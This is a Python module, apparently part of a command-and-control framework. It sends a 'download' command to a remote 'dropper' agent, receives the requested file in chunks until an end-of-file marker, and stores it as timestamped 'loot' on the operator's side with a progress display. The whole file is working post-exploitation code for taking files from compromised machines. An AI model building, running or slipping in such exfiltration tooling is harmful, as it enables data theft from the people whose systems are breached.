import os
import time
from base64 import b64decode
from gzip import decompress as degzip
from common import bcolors as bc

def main(agent, file = None):
    """REquest a file from the dropper, then receive raw data
    until the dropper sneds an end of file marker. Save to a local
    timestamped file"""

    try:
        if not file:
            bc.err_print("[!] ", "- Error - no file specified.")
            return
        agent.send( 'download ' + file)
        bc.info("{} downloading {}".format(agent.name, file))
        #Setup file to save here
        timestamp = time.strftime("-%Y-%m-%d-%H%M%S")
        if len(file.split('.')) > 1:
            nm = '.'.join(file.split('.')[:-1])
            ext = '.' + '.'.join(file.split('.')[-1:])
        else:
            nm = file
            ext = ''
        file_name = agent.listener.loot_dir + nm + ext+ '-' + agent.name + timestamp + ext
        temp_file = agent.listener.loot_dir + agent.name + 'temp.dnld'
        count = 0
        last_completion = 0
        tot_bytes = 0
        completion = 0
        gotsz = False
        scrn_w, scrn_h = os.get_terminal_size()
        scrn_w = scrn_w -7 - 20 #7 less for percentage figures + prompt + slack
        prnt_str = '{} {} {}%\r'.format('{:>' + str(int(scrn_w)) + '}', '{}', '{}' )
    except Exception as e:
        bc.err("Exception: {}".format(e))
        return


    with open(file_name, 'wb') as f:
        while True:
            try:
                chunk = agent.recv(
                        print_flag=False, debug = False, string=False, blocking=False)
                if not chunk:
                    #We're non-blocking, so there may be empty chunks
                    continue
                if b'File not found' in chunk:
                    bc.err('{} unable to download, {} file may not exist.'.format(agent.name, file))
                    return
                elif not gotsz:
                    size = float(chunk.decode()[8:])
                    #Get size to print:
                    if size/1000000000 >= 1:
                        prnt_size = '{} Gb'.format(round((size/1024000000.0), 1))
                    elif size/1000000 >= 1:
                        prnt_size = '{} Mb'.format(round((size/1024000.0), 1))
                    elif size/1000 >= 1:
                        prnt_size = '{} Kb'.format(round((size/1024.0), 1))
                    else:
                        prnt_size = '{} byte'.format(size)
                    #Now print it
                    print("")   #Neaten output
                    bc.info("{} downloading {} data.".format(agent.name, prnt_size))
                    gotsz = True
                elif chunk.endswith(b'<BSEOF>'):
                    chunk = chunk[:-7]
                    f.write(chunk) # Write those last received bits without the word 'BSEOF'
                    chunk = ''  #Because we don't want orphan bits of chunk
                    break
                else:
                    f.write(chunk)
                    tot_bytes += len(chunk)
                    completion = (tot_bytes/size)*100
                    if round(completion,0) - round(last_completion,0) >= 1.0:
                        #print("{}% downloaded.".format(int(round(completion, 0))))
                        #print('{} downloaded {}[%d%%]\r'%int(round(completion, 0)), end="")
                        print('{} downloaded {}%\r'.format(
                                bc.blue_format("[+] ", '- ' + agent.name),int(
                                round(completion, 0))), end="")

                        #print(prnt_str.format(
                        #        bc.blue_format("[+] ", '- ' + agent.name), ' downloaded ',int(
                        #        round(completion, 0))), end="")

                        #print("Chunks : {}, tot_bytes : {}".format(count, tot_bytes))
                    last_completion = completion

            except Exception as e:
                bc.err("Download chunk failed because : {}. Try again?".format(e))
                clear_pipe = b''
                while b'<BSEOF>' not in clear_pipe:
                    clear_pipe = agent.recv(print_flag=False)
                    return
                #gracefully stop download operation
            finally:
                count += 1
                chunk = ''
    print("")
    bc.success('Download complete: {}'.format(file_name), True)
